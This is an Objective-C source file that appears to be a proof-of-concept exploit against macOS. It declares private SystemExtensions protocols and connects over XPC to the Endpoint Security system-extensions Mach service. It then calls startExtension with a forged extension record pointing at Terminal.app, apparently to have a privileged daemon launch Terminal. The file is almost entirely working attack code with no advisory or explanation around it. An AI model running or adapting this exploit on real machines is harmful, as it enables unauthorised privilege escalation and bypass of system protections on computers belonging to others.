#import <Foundation/Foundation.h>
#include <dlfcn.h>

@protocol OSSystemExtensionPolicyItem
@property(readonly) BOOL modified;
@property BOOL enabled;
@property(readonly) BOOL rebootRequired;
@property(readonly) NSURL *containingAppURL;
@property(readonly) NSURL *stagedBundleURL;
@property(readonly) NSString *bundleVersion;
@property(readonly) NSString *shortVersionString;
@property(readonly) BOOL teamIDNone;
@property(readonly) BOOL teamIDPlatformBinary;
@property(readonly) NSString *teamID;
@property(readonly) NSString *usageDescription;
@property(readonly) NSString *developerName;
@property(readonly) NSString *applicationName;
@property(readonly) NSString *extensionDisplayName;
@property(readonly) NSString *identifier;
@end

@interface OSSystemExtensionInfo : NSObject <NSSecureCoding, OSSystemExtensionPolicyItem>
{
    BOOL _enabled;
    NSDictionary *_localizedInfo;
    NSDictionary *_unlocalizedInfo;
    BOOL _teamIDPlatformBinary;
    BOOL _teamIDNone;
    BOOL _active;
    BOOL _rebootRequired;
    BOOL _modified;
    NSString *_identifier;
    NSString *_developerName;
    NSArray *_categoryIdentifiers;
    NSString *_owningCategoryIdentifier;
    NSString *_teamID;
    NSString *_shortVersionString;
    NSString *_bundleVersion;
    NSURL *_containingAppURL;
    NSURL *_stagedBundleURL;
    NSString *_stagedCdhash;
    NSString *_stateString;
    NSDictionary *_additionalLaunchdPlistEntries;
}

+ (BOOL)supportsSecureCoding;
@property BOOL modified;
@property BOOL rebootRequired; 
@property(retain) NSDictionary *additionalLaunchdPlistEntries; 
@property(retain) NSString *stateString;
@property BOOL active; 
@property(retain) NSString *stagedCdhash;
@property(retain) NSURL *stagedBundleURL; 
@property(retain) NSURL *containingAppURL;
@property(retain) NSString *bundleVersion;
@property(retain) NSString *shortVersionString;
@property BOOL teamIDNone;
@property BOOL teamIDPlatformBinary;
@property(retain) NSString *teamID;
@property(retain) NSString *owningCategoryIdentifier;
@property(retain) NSArray *categoryIdentifiers;
@property(retain) NSString *developerName;
@property(retain) NSString *identifier;
@property(readonly) NSString *usageDescription;
@property(readonly) NSString *extensionDisplayName;
- (id)getLocalizedStringForKey:(id)arg1;
@property(readonly) NSString *applicationName;
@property BOOL enabled;
- (void)encodeWithCoder:(id)arg1;
- (id)initWithCoder:(id)arg1;
- (id)initWithXPCDictionary:(id)arg1;

@end
@protocol _OSSystemExtensionPointInterface <NSObject>
- (void)terminateExtension:(OSSystemExtensionInfo *)arg1 replyHandler:(void (^)(NSError *))arg2;
- (void)startExtension:(OSSystemExtensionInfo *)arg1 replyHandler:(void (^)(NSError *))arg2;
- (void)willReplaceExtension:(OSSystemExtensionInfo *)arg1 withExtension:(OSSystemExtensionInfo *)arg2 replyHandler:(void (^)(NSError *))arg3;
- (void)willUninstallExtension:(OSSystemExtensionInfo *)arg1 replyHandler:(void (^)(NSError *))arg2;
- (void)willTerminateExtension:(OSSystemExtensionInfo *)arg1 replyHandler:(void (^)(NSError *))arg2;
- (void)willStartExtension:(OSSystemExtensionInfo *)arg1 replyHandler:(void (^)(NSError *))arg2;
- (void)validateExtension:(OSSystemExtensionInfo *)arg1 atTemporaryBundleURL:(NSURL *)arg2 replyHandler:(void (^)(NSDictionary *, NSError *))arg3;
@end

#define machServiceName @"com.apple.endpointsecurity.system-extensions"
void *systemExt;

int main(void){
    
    NSLog(@"[!] Attemping to load SystemExtensions for OSSystemExtensionInfoClass");
    
    systemExt = dlopen("/System/Library/Frameworks/SystemExtensions.framework/Versions/Current/SystemExtensions", RTLD_LAZY);

    if(systemExt == NULL)
    {
        NSLog(@"[-] Failed to: Load SystemExtensions framework");
        exit(-1);
    }
    NSLog(@"[+] SystemExtensions Loaded");
    Class OSSystemExtensionInfoClass = nil;

    NSLog(@"[+] Obtaining OSSystemExtensionInfo");
    OSSystemExtensionInfoClass = NSClassFromString(@"OSSystemExtensionInfo");
    
    if (OSSystemExtensionInfoClass == nil)
    {
        NSLog(@"[-] Failed to: obtain OSSystemExtensionInfo class");
        exit(-1);
    }
    
    OSSystemExtensionInfo *info = [[OSSystemExtensionInfoClass alloc] init];

    info.stagedBundleURL = [NSURL fileURLWithPath:@"/System/Applications/Utilities/Terminal.app"];
    NSLog(@"[+] stagedBundleURL set to /System/Applications/Utilities/Terminal.app");
    info.identifier = @"com.apple.Terminal";
    NSLog(@"[+] identifier set to com.apple.Terminal");


    NSLog(@"[+] Setting Up XPC for %@", machServiceName);
    NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:machServiceName options:0x1000];
    NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(_OSSystemExtensionPointInterface)];

    [connection setRemoteObjectInterface:interface];
    [connection resume];
   
    id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error){

        NSLog(@"[-] Error: %@", error);
        exit(-1);
    }];

    NSLog(@"[+] Object: %@", obj);
    NSLog(@"[+] Connection: %@", connection);

    [obj startExtension:info replyHandler:^void(NSError *error){
            if(error != nil){
                NSLog(@"[-] Calling StartExtention failed: %@", error);
                exit(-1);
            }
    }];

    [NSThread sleepForTimeInterval:10.0f];
    NSLog(@"[+] Executed startExtension to start Terminal");

}
